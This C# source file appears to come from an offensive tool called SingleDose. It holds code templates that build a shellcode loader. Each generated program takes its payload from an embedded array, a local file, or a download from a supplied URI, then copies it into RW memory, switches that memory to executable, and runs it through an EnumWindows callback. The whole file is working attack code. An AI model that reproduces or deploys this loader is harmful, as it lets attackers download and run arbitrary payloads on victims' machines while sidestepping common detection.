namespace SingleDose
{
    class EnumWindows
    {
        public static string STATIC = @"
            System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
            {{SHELLCODE}}
            byte[] payload = payloadList.ToArray();
            ";

        public static string DYNAMIC = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)){
                Console.WriteLine(""-Bin: Path to shellcode"");
                Environment.Exit(0);
            }
            ArgValues parsedArgs = ArgParse(args);
            byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);";

        public static string DYNAMIC_ARGPARSE = @"
        public class ArgValues
        {
            public string binPath;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-BIN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.binPath = arguments[i + 1];
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            return null;
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }

            return collection;
        }";

        public static string DOWNLOAD = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)){
                Console.WriteLine(""-URI: URI to download"");
                Environment.Exit(0);
            }

            ArgValues parsedArgs = ArgParse(args);
            System.Net.WebClient wc = new System.Net.WebClient();
            byte[] payload;
            payload = wc.DownloadData(parsedArgs.DownloadURI);";

        public static string DOWNLOAD_ARGPARSE = @"
        public class ArgValues
        {
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return collection;
        }";

        public static string Body = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, 0x04);//0x04 = RW
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect); //0x20 = RX
            EnumWindows(hAlloc, IntPtr.Zero);
        }
        {{ARGS}}

        {{PINVOKE}}
    }
}";
    }
}